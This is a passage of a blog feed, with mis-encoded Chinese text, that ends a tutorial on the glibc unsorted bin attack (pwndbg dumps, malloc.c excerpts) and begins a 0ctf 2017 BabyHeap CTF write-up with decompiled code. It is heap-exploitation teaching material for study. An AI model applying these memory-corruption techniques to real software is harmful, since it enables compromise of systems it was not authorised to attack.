title="æ‰§è¡Œmalloc(0x410)"></a>æ‰§è¡Œmalloc(0x410)</h3><p>æ‰§è¡Œmalloc(0x410)æ—¶ï¼Œä¼šåˆ¤æ–­æ‰€ç”³è¯·çš„chunkå¤„äºsmallbinæ‰€åœ¨çš„èŒƒå›´ï¼Œä½†æ˜¯æ­¤æ—¶smallbinä¸­å¹¶æ²¡æœ‰ç©ºé—²çš„chunkï¼Œæ‰€ä»¥ä¼šå»unsortedbinæ‰¾ï¼Œå‘ç°unsortedbinä¸ç©ºï¼Œäºæ˜¯æŠŠunsortedbinä¸­çš„<strong>æœ€åä¸€ä¸ª</strong>chunkæ‹¿å‡ºæ¥ã€‚<br>ç”±äºä¸Šé¢æˆ‘ä»¬ä¿®æ”¹äº†bkæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€ï¼Œæ‰€ä»¥ç°åœ¨bkæŒ‡é’ˆæ‰€æŒ‡å‘çš„åœ°å€è¢«åŠ å…¥åˆ°äº†unsortedbinä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç°åœ¨è¿™ä¸ªåœ°å€æ˜¯unsortedbinä¸­æœ€åä¸€ä¸ªchunkï¼Œmallocä¹‹åå°†åœ¨è¿™ä¸ªåœ°å€ä¸­åˆ›å»ºå †å—ã€‚</p><blockquote><p>unsortedbinåœ¨ä½¿ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œé‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFOï¼ˆFirst In First outï¼‰ï¼Œå³<strong>æ’å…¥çš„æ—¶å€™æ’å…¥åˆ°unsortedbinçš„å¤´éƒ¨ï¼Œå–å‡ºçš„æ—¶å€™ä»é“¾å°¾è·å–ã€‚</strong></p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">malloc</span>ä¹‹åç»“æœå¦‚ä¸‹ï¼š<br>pwndbg&gt; unsortedbin<br>unsortedbin<br>all [corrupted]<br>FD: <span class="hljs-number">0x602000</span> â—‚â€” <span class="hljs-number">0x0</span><br>BK: <span class="hljs-number">0x7fffffffdd68</span> â€”â–¸ <span class="hljs-number">0x400870</span> (__libc_csu_init) â—‚â€” push   rbp<br>pwndbg&gt; x/<span class="hljs-number">30</span>gx &amp;main_arena<br><span class="hljs-number">0x7ffff7dd1b20</span> &lt;main_arena&gt;:<span class="hljs-number">0x0000000100000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b30</span> &lt;main_arena+<span class="hljs-number">16</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b40</span> &lt;main_arena+<span class="hljs-number">32</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b50</span> &lt;main_arena+<span class="hljs-number">48</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b60</span> &lt;main_arena+<span class="hljs-number">64</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffff7dd1b70</span> &lt;main_arena+<span class="hljs-number">80</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602620</span> #top_chunk<br><span class="hljs-number">0x7ffff7dd1b80</span> &lt;main_arena+<span class="hljs-number">96</span>&gt;:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x0000000000602000</span> <span class="hljs-meta">#malloc(0x410)</span><br><span class="hljs-number">0x7ffff7dd1b90</span> &lt;main_arena+<span class="hljs-number">112</span>&gt;:<span class="hljs-number">0x00007fffffffdd68</span><span class="hljs-number">0x00007ffff7dd1b88</span><br><span class="hljs-number">0x7ffff7dd1ba0</span> &lt;main_arena+<span class="hljs-number">128</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b88</span><span class="hljs-number">0x00007ffff7dd1b98</span><br><span class="hljs-number">0x7ffff7dd1bb0</span> &lt;main_arena+<span class="hljs-number">144</span>&gt;:<span class="hljs-number">0x00007ffff7dd1b98</span><span class="hljs-number">0x00007ffff7dd1ba8</span><br><span class="hljs-number">0x7ffff7dd1bc0</span> &lt;main_arena+<span class="hljs-number">160</span>&gt;:<span class="hljs-number">0x00007ffff7dd1ba8</span><span class="hljs-number">0x00007ffff7dd1bb8</span><br><span class="hljs-number">0x7ffff7dd1bd0</span> &lt;main_arena+<span class="hljs-number">176</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bb8</span><span class="hljs-number">0x00007ffff7dd1bc8</span><br><span class="hljs-number">0x7ffff7dd1be0</span> &lt;main_arena+<span class="hljs-number">192</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bc8</span><span class="hljs-number">0x00007ffff7dd1bd8</span><br><span class="hljs-number">0x7ffff7dd1bf0</span> &lt;main_arena+<span class="hljs-number">208</span>&gt;:<span class="hljs-number">0x00007ffff7dd1bd8</span><span class="hljs-number">0x00007ffff7dd1be8</span><br><span class="hljs-number">0x7ffff7dd1c00</span> &lt;main_arena+<span class="hljs-number">224</span>&gt;:<span class="hljs-number">0x00007ffff7dd1be8</span><span class="hljs-number">0x00007ffff7dd1bf8</span><br>pwndbg&gt; x/<span class="hljs-number">16</span>gx <span class="hljs-number">0x7fffffffdd68</span><br><span class="hljs-number">0x7fffffffdd68</span>:<span class="hljs-number">0x000000000040080a</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd78</span>:<span class="hljs-number">0x00007ffff7dd1b78</span><span class="hljs-number">0x0000000000602010</span><br>    #ç°åœ¨æ­¤åœ°å€è¢«æ›´æ”¹ä¸ºè¾ƒå¤§çš„æ•°ï¼ˆå…¶å€¼ä¸ºmain_arena+<span class="hljs-number">88</span>çš„åœ°å€ï¼‰<br><span class="hljs-number">0x7fffffffdd88</span>:<span class="hljs-number">0xbfb16d8983641800</span><span class="hljs-number">0x0000000000400870</span><br><span class="hljs-number">0x7fffffffdd98</span>:<span class="hljs-number">0x00007ffff7a2d840</span><span class="hljs-number">0x0000000000000001</span><br><span class="hljs-number">0x7fffffffdda8</span>:<span class="hljs-number">0x00007fffffffde78</span><span class="hljs-number">0x00000001f7ffcca0</span><br><span class="hljs-number">0x7fffffffddb8</span>:<span class="hljs-number">0x00000000004006a6</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffffffddc8</span>:<span class="hljs-number">0x9c796560ff5ea285</span><span class="hljs-number">0x00000000004005b0</span><br><span class="hljs-number">0x7fffffffddd8</span>:<span class="hljs-number">0x00007fffffffde70</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt;  <br></code></pre></td></tr></tbody></table></figure><p>ç”³è¯·è¿‡ç¨‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png'><img src="https://s2.loli.net/2023/09/13/FgS2tZmrEkG7Kuo.png" alt="Snipaste_2023-09-13_20-51-30.png"></p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png'><img src="https://s2.loli.net/2023/09/13/rWY6xuMZ82yFJdj.png" alt="Snipaste_2023-09-13_20-52-24.png"></p><p>æ ¸å¿ƒä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#glibc-2.23/malloc/malloc.c</span><br>#æºç ç¬¬<span class="hljs-number">3515</span><span class="hljs-number">-3517</span>è¡Œ<br>--------------------------------------------------------------------<br><span class="hljs-comment">/* remove from unsorted list */</span><br>unsorted_chunks (av)-&gt;bk = bck; <span class="hljs-comment">//unsortedbinçš„bkæ”¹ä¸ºchunkçš„bk</span><br>bck-&gt;fd = unsorted_chunks (av);<span class="hljs-comment">//å°†chunkçš„bkæ‰€æŒ‡å‘çš„fdæ”¹ä¸ºunsortedbinçš„åœ°å€</span><br><span class="hljs-comment">//unsorted_chunks(av)å…¶å®æ˜¯&amp;main_arena.top</span><br>--------------------------------------------------------------------<br>è§£é‡Šï¼š<br>unsorted_chunks (av)-&gt;bk(unsortedbinçš„bk)= bck(chunkçš„bk); <br>bck-&gt;fd (chunkçš„fd)= unsorted_chunks (av);<br></code></pre></td></tr></tbody></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; info local<br>stack_var = <span class="hljs-number">140737351850872</span><span class="hljs-comment">//ä¸€ä¸ªå¾ˆå¤§çš„æ•°å­— 0x7ffff7dd1b78 å®é™…ä¸Šæ˜¯ main_arena+88</span><br>p = <span class="hljs-number">0x602010</span><br></code></pre></td></tr></tbody></table></figure><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>å†æ¥çœ‹ä¸€ä¸‹unsortedbinçš„æºç </p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<br>     {<br>       bck = victim-&gt;bk;<br>       <span class="hljs-keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="hljs-number">0</span>))<br>         malloc_printerr (check_action, <span class="hljs-string">"malloc(): memory corruption"</span>,<br>                          chunk2mem (victim), av);<br>       size = chunksize (victim);<br><br>       <span class="hljs-comment">/*</span><br><span class="hljs-comment">          If a small request, try to use last remainder if it is the</span><br><span class="hljs-comment">          only chunk in unsorted bin.  This helps promote locality for</span><br><span class="hljs-comment">          runs of consecutive small requests. This is the only</span><br><span class="hljs-comment">          exception to best-fit, and applies only when there is</span><br><span class="hljs-comment">          no exact fit for a small chunk.</span><br><span class="hljs-comment">        */</span><br> #æ˜¾ç„¶ï¼Œbckè¢«ä¿®æ”¹ï¼Œå¹¶ä¸ç¬¦åˆè¿™é‡Œçš„è¦æ±‚<br>       <span class="hljs-keyword">if</span> (in_smallbin_range (nb) &amp;&amp;<br>           bck == unsorted_chunks (av) &amp;&amp;<br>           victim == av-&gt;last_remainder &amp;&amp;<br>           (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>         {<br>           <span class="hljs-comment">/* split and reattach remainder */</span><br>           remainder_size = size - nb;<br>           remainder = chunk_at_offset (victim, nb);<br>           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;<br>           av-&gt;last_remainder = remainder;<br>           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);<br>           <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>             {<br>               remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>               remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>             }<br><br>           set_head (victim, nb | PREV_INUSE |<br>                     (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>           set_head (remainder, remainder_size | PREV_INUSE);<br>           set_foot (remainder, remainder_size);<br><br>           check_malloced_chunk (av, victim, nb);<br>           <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>           alloc_perturb (p, bytes);<br>           <span class="hljs-keyword">return</span> p;<br>         }<br><br>       <span class="hljs-comment">/* remove from unsorted list */</span><br></code></pre></td></tr></tbody></table></figure><p>å¯ä»¥çœ‹å‡ºï¼Œåœ¨å°† unsorted bin çš„æœ€åä¸€ä¸ª chunk æ‹¿å‡ºæ¥çš„è¿‡ç¨‹ä¸­ï¼Œ<strong>victim çš„ fd å¹¶æ²¡æœ‰å‘æŒ¥ä½œç”¨ï¼Œæ‰€ä»¥å³ä½¿æˆ‘ä»¬ä¿®æ”¹äº†å…¶ä¸ºä¸€ä¸ªä¸åˆæ³•çš„å€¼ä¹Ÿæ²¡æœ‰å…³ç³»ã€‚</strong>ç„¶è€Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œunsorted bin é“¾è¡¨å¯èƒ½å°±æ­¤ç ´åï¼Œåœ¨æ’å…¥ chunk æ—¶ï¼Œå¯èƒ½ä¼šå‡ºç°é—®é¢˜ã€‚</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">unsorted bin attack å®ç°äº†æŠŠä¸€ä¸ªè¶…çº§å¤§çš„æ•°ï¼ˆunsorted bin çš„åœ°å€ï¼‰å†™åˆ°ä¸€ä¸ªåœ°æ–¹<br>å®é™…ä¸Šè¿™ç§æ”»å‡»æ–¹æ³•å¸¸å¸¸ç”¨æ¥ä¿®æ”¹ global_max_fast æ¥ä¸ºè¿›ä¸€æ­¥çš„ fastbin attack åšå‡†å¤‡<br><br>æˆ‘ä»¬å‡†å¤‡æŠŠè¿™ä¸ªåœ°æ–¹ <span class="hljs-number">0x7fff7b5eecf8</span> çš„å€¼ <span class="hljs-number">0</span> æ›´æ”¹ä¸ºä¸€ä¸ªå¾ˆå¤§çš„æ•°<br><br>ä¸€å¼€å§‹å…ˆç”³è¯·ä¸€ä¸ªæ¯”è¾ƒæ­£å¸¸çš„ chunk: <span class="hljs-number">0x24d0010</span><br>å†åˆ†é…ä¸€ä¸ªé¿å…ä¸ top chunk åˆå¹¶<br><br>å½“æˆ‘ä»¬é‡Šæ”¾æ‰ç¬¬ä¸€ä¸ª chunk ä¹‹åä»–ä¼šè¢«æ”¾åˆ° unsorted bin ä¸­ï¼ŒåŒæ—¶å®ƒçš„ bk æŒ‡é’ˆä¸º <span class="hljs-number">0x7f691338eb78</span><br>ç°åœ¨å‡è®¾æœ‰ä¸ªæ¼æ´ï¼Œå¯ä»¥è®©æˆ‘ä»¬ä¿®æ”¹ <span class="hljs-built_in">free</span> äº†çš„ chunk çš„ bk æŒ‡é’ˆ<br>æˆ‘ä»¬æŠŠç›®æ ‡åœ°å€ï¼ˆæƒ³è¦æ”¹ä¸ºè¶…å¤§å€¼çš„é‚£ä¸ªåœ°æ–¹ï¼‰å‡å» <span class="hljs-number">0x10</span> å†™åˆ° bk æŒ‡é’ˆ:<span class="hljs-number">0x7fff7b5eece8</span><br><br>å†å» <span class="hljs-built_in">malloc</span> çš„æ—¶å€™å¯ä»¥å‘ç°é‚£é‡Œçš„å€¼å·²ç»æ”¹å˜ä¸º unsorted bin çš„åœ°å€<br><span class="hljs-number">0x7fff7b5eecf8</span>: <span class="hljs-number">0x7f691338eb78</span><br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° <strong>unsorted bin attack ç¡®å®å¯ä»¥ä¿®æ”¹ä»»æ„åœ°å€çš„å€¼</strong>ï¼Œ<strong>ä½†æ˜¯æ‰€ä¿®æ”¹æˆçš„å€¼å´ä¸å—æˆ‘ä»¬æ§åˆ¶</strong>ï¼Œå”¯ä¸€å¯ä»¥çŸ¥é“çš„æ˜¯ï¼Œè¿™ä¸ªå€¼æ¯”è¾ƒå¤§ã€‚è¿™çœ‹èµ·æ¥ä¼¼ä¹å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨å¤„ï¼Œä½†æ˜¯å…¶å®è¿˜æ˜¯æœ‰ç‚¹ç”¨çš„ï¼Œæ¯”å¦‚è¯´<br>â— <strong>æˆ‘ä»¬é€šè¿‡ä¿®æ”¹å¾ªç¯çš„æ¬¡æ•°æ¥ä½¿å¾—ç¨‹åºå¯ä»¥æ‰§è¡Œå¤šæ¬¡å¾ªç¯ã€‚</strong><br><strong>â—</strong> <strong>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹heapä¸­çš„global_max_fastæ¥ä½¿å¾—æ›´å¤§çš„chunkå¯ä»¥è¢«è§†ä¸º fastbinï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å»æ‰§è¡Œä¸€äº› fastbin attack äº†ã€‚</strong></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ„Ÿè§‰å…¨ç¯‡çœ‹æœ€åä¸€å¥è¯å°±å¤Ÿäº†(å“ˆå“ˆå“ˆ)</p><p>æ€»ç»“ä¸€ä¸‹unsortedbin attackè¿™ç§æ”»å‡»æ–¹å¼ï¼š<br>é¦–å…ˆæˆ‘ä»¬å°†ä¸€ä¸ªå †å—é‡Šæ”¾åˆ°unsortedbinä¸­ï¼Œç„¶ååˆ©ç”¨å †æº¢å‡ºä¿®æ”¹unsortedbinä¸­chunkçš„bkæŒ‡é’ˆï¼Œè¿™ä¸ªbkæŒ‡é’ˆæ˜¯æŒ‡å‘target_addr-0x10ã€‚å½“æˆ‘ä»¬mallocç”³è¯·unsortedbinä¸­çš„å †å—æ—¶ï¼Œtarget_addrä¸­çš„å€¼å°±ä¼šå˜æˆmain_arena+88åœ°å€çš„å€¼</p><blockquote><p>target_addrï¼šç›®æ ‡åœ°å€ï¼ˆæƒ³è¦ä¿®æ”¹ä¸ºè¶…å¤§æ•°çš„åœ°å€ï¼‰ </p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å…³äºunsorted-bin-å’Œ-unsorted-bin-attack&quot;&gt;&lt;a href=&quot;#å…³äºunsorted-bin-å’Œ-unsorted-bin-attack&quot; class=&quot;headerlink&quot; title=&quot;å…³äºunsorted bin å’Œ uns</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="unsoted bin attack" scheme="https://kylinxin.github.io/tags/unsoted-bin-attack/"/>
    
  </entry>
  
  <entry>
    <title>0ctf_2017_BabyHeap</title>
    <link href="https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/"/>
    <id>https://kylinxin.github.io/2023/09/13/0ctf_2017_BabyHeap/</id>
    <published>2023-09-13T07:26:29.000Z</published>
    <updated>2023-09-13T09:29:56.357Z</updated>
    
    <content type="html"><![CDATA[<h1 id="fastbin-attackä¸­çš„Arbitrary-Allocï¼ˆä¾‹é¢˜ï¼‰"><a href="#fastbin-attackä¸­çš„Arbitrary-Allocï¼ˆä¾‹é¢˜ï¼‰" class="headerlink" title="fastbin_attackä¸­çš„Arbitrary Allocï¼ˆä¾‹é¢˜ï¼‰"></a><strong>fastbin_attackä¸­çš„Arbitrary Allocï¼ˆä¾‹é¢˜ï¼‰</strong></h1><p>å…·ä½“ä¾‹å­åŸç†ç½‘ä¸Šå¾ˆå¤šï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ï¼Œè¿™é‡Œè®²è§£ä¸€é“<strong>fastbin_attackä¸­çš„Arbitrary Alloc</strong></p><blockquote><p>é¢˜ç›®æ¥æºï¼š0ctf 2017 BabyHeap<br>å‚è€ƒèµ„æ–™ï¼š<br><a href="https://blog.csdn.net/qq_36495104/article/details/106202135">https://blog.csdn.net/qq_36495104/article/details/106202135</a> #æ€è·¯<br>CTF-wiki<br><a href="https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ">https://www.yuque.com/hxfqg9/bin/bp97ri#sKWXZ</a> #payload<br><a href="https://blog.csdn.net/counsellor/article/details/81543197">https://blog.csdn.net/counsellor/article/details/81543197</a> #å…³é—­åœ°å€éšæœºåŒ–</p></blockquote><blockquote><p>é™„ä»¶ï¼š<br>é“¾æ¥: <a href="https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw">https://pan.baidu.com/s/1uG2cfQae0iwULtYvRmEBIw</a>  å¯†ç : f1i6<br>â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V3çš„åˆ†äº«</p></blockquote><hr><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>å°†æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œé¦–å…ˆæ£€æŸ¥ä¸€ä¸‹æ–‡ä»¶çš„ä¿æŠ¤æƒ…å†µï¼š</p><p class='item-img' data-src='https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png'><img src="https://s2.loli.net/2023/09/13/SUZpeg5FXnlivAP.png" alt="Snipaste_2023-09-13_15-31-15.png"></p><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å…¨éƒ¨å¼€å¯ï¼ˆè¿™è¿˜ç©ä¸ªæ¯›çº¿å•Šï¼‰<br>å…·ä½“çœ‹ä¸€ä¸‹å„ä¸ªä¿æŠ¤ï¼š</p><blockquote><p>Arch:   amd64-64-little<br>è¿™ä¸ªè¯´æ˜ç¨‹åºæ˜¯64ä½ç¨‹åºï¼Œå°ç«¯åº<br>   RELRO:   Full RELRO<br>Full RELROå¼€å¯ï¼Œä½¿æ•´ä¸ª GOT åªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œè¿›ä¸€æ­¥æ¥è¯´GOTè¡¨æ— æ³•è¢«ä¿®æ”¹<br>   Stack:   Canary found<br>å¯¹ä½¿ç”¨éšæœºæ•°æ¯ä¸ªå‡½æ•°è¿›è¡Œä¿æŠ¤ï¼Œé˜²æ­¢æ ˆæº¢å‡º<br>   NX:    NX enabled<br>ä¸èƒ½å‘æ ˆä¸Šç›´æ¥æ³¨å…¥shellcode<br>   PIE:    PIE enabled<br>åœ°å€éšæœºåŒ–ï¼Œæˆ‘æ„Ÿè§‰è¿™ä¸ªä¿æŠ¤æ˜¯æœ€æ¶å¿ƒçš„<br>æ¥çœ‹ä¸€ä¸‹æˆ‘çš„Linuxç¯å¢ƒï¼š<br>Ubuntuç‰ˆæœ¬ï¼š16.04</p></blockquote><p>å…¶ä¸­libc-2.23.soæ˜¯æˆ‘æœ¬æœºçš„libcæ–‡ä»¶</p><h2 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h2><p>æ•´ä¸ªç¨‹åºç›¸å½“äºä¸€ä¸ªå †å†…å­˜ç®¡ç†å™¨ï¼Œé™æ€åˆ†æä¸€ä¸‹å§ï¼š</p><h3 id="main-å‡½æ•°"><a href="#main-å‡½æ•°" class="headerlink" title="main å‡½æ•°"></a>main å‡½æ•°</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>{<br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  addr = get_addr();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  {<br>    menu();                                     <span class="hljs-comment">// </span><br>                                                <span class="hljs-comment">//   puts("1. Allocate");</span><br>                                                <span class="hljs-comment">//   puts("2. Fill");</span><br>                                                <span class="hljs-comment">//   puts("3. Free");</span><br>                                                <span class="hljs-comment">//   puts("4. Dump");</span><br>                                                <span class="hljs-comment">//   puts("5. Exit");</span><br>                                                <span class="hljs-comment">//   printf("Command: ");</span><br>                                                <span class="hljs-comment">// </span><br>    input();<br>    <span class="hljs-keyword">switch</span> ( (<span class="hljs-type">unsigned</span> __int64)off_14F4 )<br>    {<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">1uLL</span>:<br>        Allocate((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">2uLL</span>:<br>        Fill((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">3uLL</span>:<br>        Free((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">4uLL</span>:<br>        Dump((__int64)addr);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">5uLL</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">default</span>:<br>        <span class="hljs-keyword">continue</span>;<br>    }<br>  }<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¸»å‡½æ•°å†…å®¹ï¼ŒåŒ…å«èœå•å‡½æ•°å’Œå››ä¸ªå †åŠŸèƒ½å‡½æ•°</p><h3 id="get-addr-å‡½æ•°-ç”Ÿæˆéšæœºåœ°å€"><a href="#get-addr-å‡½æ•°-ç”Ÿæˆéšæœºåœ°å€" class="headerlink" title="get_addr å‡½æ•°(ç”Ÿæˆéšæœºåœ°å€)"></a>get_addr å‡½æ•°(ç”Ÿæˆéšæœºåœ°å€)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">char</span> *<span class="hljs-title function_">get_addr</span><span class="hljs-params">()</span><br>{<br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [rsp+4h] [rbp-3Ch]</span><br>  <span class="hljs-type">char</span> *addr; <span class="hljs-comment">// [rsp+8h] [rbp-38h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+10h] [rbp-30h]</span><br>  __int64 buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-20h] BYREF</span><br><br>  buf[<span class="hljs-number">3</span>] = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0LL</span>);<br>  